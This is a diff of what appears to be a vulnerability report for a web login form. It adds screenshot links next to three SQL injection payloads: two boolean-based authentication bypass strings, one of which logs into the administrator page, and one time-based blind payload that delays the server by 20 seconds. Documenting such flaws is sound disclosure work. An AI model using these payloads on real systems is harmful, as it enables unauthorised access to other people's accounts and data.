@@ -38,6 +38,8 @@ username=a%27+or+666%3D667--+&password=b&submit=
 
 Invalid username or password
 
+![image](https://github.com/ggforlove/pic/blob/main/in.png)
+
 Payload2:username=a%27+or+666%3D666--+&password=b&submit=
 
 ```
@@ -68,6 +70,8 @@ username=a%27+or+666%3D666--+&password=b&submit=
 
 The administrator page is successfully logged in
 
+![image](https://github.com/ggforlove/pic/blob/main/ad.png)
+
 Payload3:username=a'%2b(select*from(select(sleep(20)))a)%2b'&password=b&submit=
 
 ```
@@ -91,5 +95,6 @@ username=a'%2b(select*from(select(sleep(20)))a)%2b'&password=b&submit=
 
 The server's response time is 20 seconds
 
+![image](https://github.com/ggforlove/pic/blob/main/sleep.png)
 
 
